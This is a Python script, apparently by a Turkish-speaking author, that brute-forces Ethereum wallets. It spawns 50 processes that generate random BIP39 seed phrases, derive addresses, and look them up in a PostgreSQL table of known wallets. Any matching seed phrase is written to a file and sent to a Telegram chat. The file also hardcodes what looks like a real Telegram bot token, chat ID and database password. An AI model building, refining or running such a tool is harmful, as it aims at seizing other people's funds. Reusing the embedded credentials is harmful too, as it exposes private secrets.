import os
import threading
import time
from concurrent.futures import ProcessPoolExecutor, as_completed
from random import sample
from bip_utils import Bip39SeedGenerator, Bip39MnemonicGenerator, Bip39WordsNum, Bip44, Bip44Coins, Bip44Changes
import requests
import psycopg2
from psycopg2 import sql
from multiprocessing import Manager

# Dosya yolları
data_dir = "data"
output_file = "wallet.txt"
log_file = "son10saniye.txt"

# Telegram Bot Token ve Chat ID
TELEGRAM_BOT_TOKEN = "6498809067:AAH7llFBu1Qz59PAB9JgKqpZ1k9ZydggPF8"
TELEGRAM_CHAT_ID = "-1001854975520"

# PostgreSQL bağlantı bilgileri
db_config = {
    'dbname': 'postgres',
    'user': 'postgres',
    'password': '159951aaa',
    'host': '192.168.1.29',
    'port': '5432'
}

def generate_eth_address(seed_words):
    try:
        seed = Bip39SeedGenerator(seed_words).Generate()
        bip44_mst_ctx = Bip44.FromSeed(seed, Bip44Coins.ETHEREUM)
        bip44_acc_ctx = bip44_mst_ctx.Purpose().Coin().Account(0)
        bip44_chg_ctx = bip44_acc_ctx.Change(Bip44Changes.CHAIN_EXT)
        bip44_addr_ctx = bip44_chg_ctx.AddressIndex(0)
        address = bip44_addr_ctx.PublicKey().ToAddress()
        return address
    except Exception as e:
        print(f"Error generating address: {e}")
        return None

def send_telegram_notification(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message
    }
    headers = {
        "Content-Type": "application/json"
    }
    try:
        response = requests.post(url, json=payload, headers=headers)
        return response.status_code == 200
    except Exception as e:
        print(f"Error sending telegram notification: {e}")
        return False

def check_wallet_address_in_db(address):
    address_without_0x = address[2:] if address.startswith("0x") else address
    conn = psycopg2.connect(**db_config)
    cur = conn.cursor()
    try:
        query = sql.SQL("SELECT 1 FROM wallets WHERE address = %s")
        cur.execute(query, (address_without_0x,))
        result = cur.fetchone()
    except psycopg2.Error as e:
        print(f"Database error: {e}")
        result = None
    finally:
        cur.close()
        conn.close()
    return result is not None

def check_and_save_address(seed_words, output_path, found_count, not_found_count, lock):
    address = generate_eth_address(seed_words)
    if not address:
        return
    
    if check_wallet_address_in_db(address):
        with lock:
            with open(output_path, "a") as out_file:
                out_file.write(f"Seed Words: {seed_words}\nAddress: {address}\n\n")
        message = f"Seed Words: {seed_words}\nAddress: {address}\n\n"
        send_telegram_notification(message)
        with lock:
            found_count.value += 1
    else:
        print(f"Wallet: {address} not found in database")
        with lock:
            not_found_count.value += 1

def generate_valid_mnemonic():
    mnemonic = Bip39MnemonicGenerator().FromWordsNumber(Bip39WordsNum.WORDS_NUM_12)
    return str(mnemonic)

def handle_keyword(output_path, found_count, not_found_count, checked_count, lock):
    seed_words = generate_valid_mnemonic()
    check_and_save_address(seed_words, output_path, found_count, not_found_count, lock)
    with lock:
        checked_count.value += 1

def send_daily_summary(found_count, not_found_count, lock):
    message = f"PC2Daily Summary:\nFound Wallets: {found_count.value}\nNot Found Wallets: {not_found_count.value}"
    send_telegram_notification(message)
    with lock:
        found_count.value = 0
        not_found_count.value = 0

def start_daily_summary_timer(found_count, not_found_count, lock):
    while True:
        time.sleep(24 * 3600)
        send_daily_summary(found_count, not_found_count, lock)

def log_wallets_checked(total_checked_counts):
    with open(log_file, "a") as log:
        total_checked = sum(count.value for count in total_checked_counts)
        log.write(f"Wallets checked in the last 10 seconds: {total_checked}\n")

def start_10s_logging_timer(total_checked_counts, lock):
    while True:
        time.sleep(10)
        with lock:
            log_wallets_checked(total_checked_counts)
            for count in total_checked_counts:
                count.value = 0

if __name__ == '__main__':
    manager = Manager()
    found_count = manager.Value('i', 0)
    not_found_count = manager.Value('i', 0)
    total_checked_counts = [manager.Value('i', 0) for _ in range(50)]
    lock = manager.Lock()

    timer_process = threading.Thread(target=start_daily_summary_timer, args=(found_count, not_found_count, lock), daemon=True)
    timer_process.start()

    log_timer_process = threading.Thread(target=start_10s_logging_timer, args=(total_checked_counts, lock), daemon=True)
    log_timer_process.start()

    with ProcessPoolExecutor(max_workers=50) as executor:
        while True:
            tasks = [(output_file, found_count, not_found_count, total_checked_counts[i], lock) for i in range(50)]
            futures = [executor.submit(handle_keyword, *task) for task in tasks]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(f"Error in future result: {e}")

    print("Tüm işlemler tamamlandı.")
